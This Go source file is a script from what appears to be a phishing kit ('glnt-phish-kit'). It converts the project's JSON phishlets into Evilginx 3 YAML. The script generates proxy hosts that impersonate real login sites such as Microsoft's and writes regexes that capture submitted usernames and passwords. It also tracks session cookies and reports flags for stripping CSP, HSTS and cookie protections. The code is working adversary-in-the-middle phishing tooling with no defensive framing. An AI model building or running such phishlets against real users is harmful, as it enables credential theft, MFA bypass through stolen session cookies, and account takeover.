// json2evilginx converts JSON phishlets from this project into Evilginx 3 YAML format.
//
// Usage:
//
//	# Convert a single phishlet
//	go run ./scripts/json2evilginx --input proxy-server/phishlets/microsoft.json --output exports/evilginx/microsoft.yaml
//
//	# Convert a single phishlet via stdin
//	cat proxy-server/phishlets/microsoft.json | go run ./scripts/json2evilginx > exports/evilginx/microsoft.yaml
//
//	# Convert all phishlets at once (default when no --input flag)
//	go run ./scripts/json2evilginx --all

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
)

// JSON input structures — match the project's phishlet schema.
type jsonPhishlet struct {
	Name             string            `json:"name"`
	Label            string            `json:"label"`
	Upstream         string            `json:"upstream"`
	Hostname         string            `json:"hostname"`
	UpstreamHosts    []string          `json:"upstream_hosts"`
	ProxyPaths       []string          `json:"proxy_paths"`
	CredentialFields credentialFields  `json:"credential_fields"`
	SessionCookies   []string          `json:"session_cookies"`
	Rewrite          rewrite           `json:"rewrite"`
	PathMap          map[string]string `json:"path_map"`
}

type credentialFields struct {
	Username []string `json:"username"`
	Password []string `json:"password"`
}

type rewrite struct {
	StripCSP          bool `json:"strip_csp"`
	StripXFO          bool `json:"strip_xfo"`
	StripHSTS         bool `json:"strip_hsts"`
	StripCookieSecure bool `json:"strip_cookie_secure"`
	StripCookieDomain bool `json:"strip_cookie_domain"`
	RewriteLocation   bool `json:"rewrite_location"`
}

// splitHost extracts the leftmost subdomain and the rest as the domain.
// e.g., "login.microsoftonline.com" => ("login", "microsoftonline.com")
// e.g., "okta.com" => ("", "okta.com")
func splitHost(host string) (sub, domain string) {
	parts := strings.Split(host, ".")
	if len(parts) <= 2 {
		return "", host
	}
	return parts[0], strings.Join(parts[1:], ".")
}

// normalizeURL ensures the upstream string is parsable as a URL.
// "okta.com" and "https://login.microsoftonline.com" both work.
func normalizeURL(raw string) (*url.URL, error) {
	if !strings.Contains(raw, "://") {
		raw = "https://" + raw
	}
	return url.Parse(raw)
}

// buildCredRegex builds a regex alternation that matches form-encoded POST bodies.
// fields=["loginfmt","login","email"] => "(?:loginfmt|login|email)=([^&]+)"
func buildCredRegex(fields []string) string {
	if len(fields) == 0 {
		return ""
	}
	escaped := make([]string, len(fields))
	for i, f := range fields {
		escaped[i] = regexp.QuoteMeta(f)
	}
	return "(?:" + strings.Join(escaped, "|") + ")=([^&]+)"
}

// yamlString returns a YAML-safe representation of s.
// Empty strings and strings with characters that could confuse a YAML parser
// are double-quoted; everything else is returned bare.
func yamlString(s string) string {
	if s == "" {
		return `""`
	}
	// Characters that are YAML syntax when appearing in bare (unquoted) scalars.
	// We double-quote if any are present to avoid parser ambiguity.
	if strings.ContainsAny(s, "{}[]#&*!|>%@`'\"") ||
		strings.HasPrefix(s, ": ") || strings.HasPrefix(s, "- ") ||
		strings.HasSuffix(s, ":") {
		return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"`
	}
	return s
}

// writeEvilginxYAML writes the Evilginx 3 phishlet YAML to w.
func writeEvilginxYAML(w io.Writer, in *jsonPhishlet) error {
	// --- Parse upstream URL ---
	upURL, err := normalizeURL(in.Upstream)
	if err != nil {
		return fmt.Errorf("invalid upstream URL %q: %w", in.Upstream, err)
	}
	upHost := upURL.Hostname()
	upSub, upDomain := splitHost(upHost)

	// --- Determine phishing hostname ---
	phHost := in.Hostname
	if phHost == "" {
		// No hostname set — use a placeholder derived from the upstream.
		phSubPlaceholder := upSub
		if phSubPlaceholder == "" {
			phSubPlaceholder = "login"
		}
		phHost = phSubPlaceholder + "." + in.Name + ".example.com"
	}
	phSub, phDomain := splitHost(phHost)

	// --- Build regexes for credential detection ---
	userRE := buildCredRegex(in.CredentialFields.Username)
	passRE := buildCredRegex(in.CredentialFields.Password)

	// --- Header comments ---
	fmt.Fprintf(w, "# =============================================================================\n")
	fmt.Fprintf(w, "# Evilginx 3 Phishlet — converted from %s.json\n", in.Name)
	fmt.Fprintf(w, "# =============================================================================\n")
	fmt.Fprintf(w, "#\n")
	fmt.Fprintf(w, "# IMPORTANT: This is an automated conversion. Operator MUST review before use.\n")
	fmt.Fprintf(w, "#\n")

	// Session cookies note
	if len(in.SessionCookies) > 0 {
		fmt.Fprintf(w, "# Session cookies (Evilginx auto-detects these; listed for operator reference):\n")
		for _, c := range in.SessionCookies {
			fmt.Fprintf(w, "#   - %s\n", c)
		}
		fmt.Fprintf(w, "#\n")
	}

	// Hostname placeholder warning
	if in.Hostname == "" {
		fmt.Fprintf(w, "# WARNING: The JSON phishlet did not define a hostname.\n")
		fmt.Fprintf(w, "#          A placeholder hostname %q was generated.\n", phHost)
		fmt.Fprintf(w, "#          You MUST update proxy_hosts[].phish_sub and sub_filters[].hostname\n")
		fmt.Fprintf(w, "#          to match your actual phishing domain before using this phishlet.\n")
		fmt.Fprintf(w, "#\n")
	}

	// Rewrite settings note
	if in.Rewrite.StripCSP || in.Rewrite.StripXFO || in.Rewrite.StripHSTS ||
		in.Rewrite.StripCookieSecure || in.Rewrite.StripCookieDomain || in.Rewrite.RewriteLocation {
		var active []string
		if in.Rewrite.StripCSP {
			active = append(active, "strip_csp")
		}
		if in.Rewrite.StripXFO {
			active = append(active, "strip_xfo")
		}
		if in.Rewrite.StripHSTS {
			active = append(active, "strip_hsts")
		}
		if in.Rewrite.StripCookieSecure {
			active = append(active, "strip_cookie_secure")
		}
		if in.Rewrite.StripCookieDomain {
			active = append(active, "strip_cookie_domain")
		}
		if in.Rewrite.RewriteLocation {
			active = append(active, "rewrite_location")
		}
		fmt.Fprintf(w, "# JSON rewrite flags active: %s\n", strings.Join(active, ", "))
		fmt.Fprintf(w, "# Evilginx auto_filter handles some of these; verify after deployment.\n")
		fmt.Fprintf(w, "#\n")
	}

	if len(in.UpstreamHosts) > 0 {
		fmt.Fprintf(w, "# Additional upstream hosts (not auto-converted — add as extra proxy_hosts entries):\n")
		for _, h := range in.UpstreamHosts {
			u, err := normalizeURL(h)
			if err == nil {
				usub, udom := splitHost(u.Hostname())
				fmt.Fprintf(w, "#   - phish_sub: %s  orig_sub: %s  domain: %s  (from %s)\n", phSub, usub, udom, h)
			} else {
				fmt.Fprintf(w, "#   - %s (unparseable)\n", h)
			}
		}
		fmt.Fprintf(w, "#\n")
	}

	if len(in.PathMap) > 0 {
		fmt.Fprintf(w, "# Path map overrides defined in JSON phishlet:\n")
		keys := make([]string, 0, len(in.PathMap))
		for k := range in.PathMap {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			fmt.Fprintf(w, "#   %s -> %s\n", k, in.PathMap[k])
		}
		fmt.Fprintf(w, "#\n")
	}

	// --- YAML body ---
	fmt.Fprintf(w, "\n")
	fmt.Fprintf(w, "name: %s\n", in.Name)
	fmt.Fprintf(w, "author: \"glnt-phish-kit\"\n")
	fmt.Fprintf(w, "min_ver: \"3.0.0\"\n")

	// proxy_hosts
	fmt.Fprintf(w, "proxy_hosts:\n")
	fmt.Fprintf(w, "  - phish_sub: %s\n", phSub)
	fmt.Fprintf(w, "    orig_sub: %s\n", upSub)
	fmt.Fprintf(w, "    domain: %s\n", upDomain)
	fmt.Fprintf(w, "    session: true\n")
	fmt.Fprintf(w, "    is_landing: true\n")
	fmt.Fprintf(w, "    auto_filter: true\n")

	// sub_filters
	fmt.Fprintf(w, "sub_filters:\n")
	fmt.Fprintf(w, "  - hostname: %s\n", phHost)
	fmt.Fprintf(w, "    sub: %s\n", phSub)
	fmt.Fprintf(w, "    domain: %s\n", phDomain)
	fmt.Fprintf(w, "    replace:\n")
	fmt.Fprintf(w, "      from: %s\n", phHost)
	fmt.Fprintf(w, "      to: %s\n", upHost)

	// auth_urls — combine upstream with each proxy_path
	fmt.Fprintf(w, "auth_urls:\n")
	for _, pp := range in.ProxyPaths {
		// Build full URL: upstream base + proxy path
		authURL := upURL.Scheme + "://" + upHost + pp
		fmt.Fprintf(w, "  - %s\n", authURL)
	}

	// Landing path
	fmt.Fprintf(w, "landing_path: \"/\"\n")

	// Credential regexes
	fmt.Fprintf(w, "user_re: %s\n", yamlString(userRE))
	fmt.Fprintf(w, "pass_re: %s\n", yamlString(passRE))

	// Static fields
	fmt.Fprintf(w, "force_post: false\n")
	fmt.Fprintf(w, "is_mfa: false\n")

	return nil
}

func convertFile(inputPath, outputPath string) error {
	// Read input
	var in io.Reader
	if inputPath == "" || inputPath == "-" {
		in = os.Stdin
	} else {
		f, err := os.Open(inputPath)
		if err != nil {
			return fmt.Errorf("open input: %w", err)
		}
		defer f.Close()
		in = f
	}

	data, err := io.ReadAll(in)
	if err != nil {
		return fmt.Errorf("read input: %w", err)
	}

	var p jsonPhishlet
	if err := json.Unmarshal(data, &p); err != nil {
		return fmt.Errorf("parse JSON: %w", err)
	}

	// Validate required fields
	if p.Name == "" {
		return fmt.Errorf("phishlet has no 'name' field")
	}
	if p.Upstream == "" {
		return fmt.Errorf("phishlet has no 'upstream' field")
	}

	// Write output
	var out io.Writer
	if outputPath == "" || outputPath == "-" {
		out = os.Stdout
	} else {
		if err := os.MkdirAll(filepath.Dir(outputPath), 0o755); err != nil {
			return fmt.Errorf("create output dir: %w", err)
		}
		f, err := os.Create(outputPath)
		if err != nil {
			return fmt.Errorf("create output: %w", err)
		}
		defer f.Close()
		out = f
	}

	if err := writeEvilginxYAML(out, &p); err != nil {
		return fmt.Errorf("write YAML: %w", err)
	}

	return nil
}

// convertAll processes every .json file in phishletDir and writes YAML to outputDir.
func convertAll(phishletDir, outputDir string) error {
	entries, err := os.ReadDir(phishletDir)
	if err != nil {
		return fmt.Errorf("read phishlet dir %q: %w", phishletDir, err)
	}

	converted := 0
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".json") {
			continue
		}
		inputPath := filepath.Join(phishletDir, entry.Name())
		outName := strings.TrimSuffix(entry.Name(), ".json") + ".yaml"
		outputPath := filepath.Join(outputDir, outName)

		fmt.Fprintf(os.Stderr, "Converting %s -> %s\n", inputPath, outputPath)
		if err := convertFile(inputPath, outputPath); err != nil {
			return fmt.Errorf("convert %s: %w", entry.Name(), err)
		}
		converted++
	}
	fmt.Fprintf(os.Stderr, "Done. Converted %d phishlets to %s/\n", converted, outputDir)
	return nil
}

func run() error {
	inputFlag := flag.String("input", "", "Input JSON phishlet file (or - for stdin)")
	outputFlag := flag.String("output", "", "Output YAML file (or - for stdout)")
	allFlag := flag.Bool("all", false, "Convert all phishlets in proxy-server/phishlets/")
	phishletDir := flag.String("phishlet-dir", "proxy-server/phishlets", "Directory containing JSON phishlets")
	outputDir := flag.String("output-dir", "exports/evilginx", "Directory for output YAML files")
	flag.Parse()

	// --all: always batch mode, regardless of stdin
	if *allFlag {
		return convertAll(*phishletDir, *outputDir)
	}

	// --input specified: single file mode
	if *inputFlag != "" {
		return convertFile(*inputFlag, *outputFlag)
	}

	// No flags: check if stdin is piped; if not, default to batch mode
	stat, _ := os.Stdin.Stat()
	if (stat.Mode() & os.ModeCharDevice) == 0 {
		return convertFile("", *outputFlag)
	}

	// Interactive terminal with no flags — batch mode
	return convertAll(*phishletDir, *outputDir)
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: %v\n", err)
		os.Exit(1)
	}
}
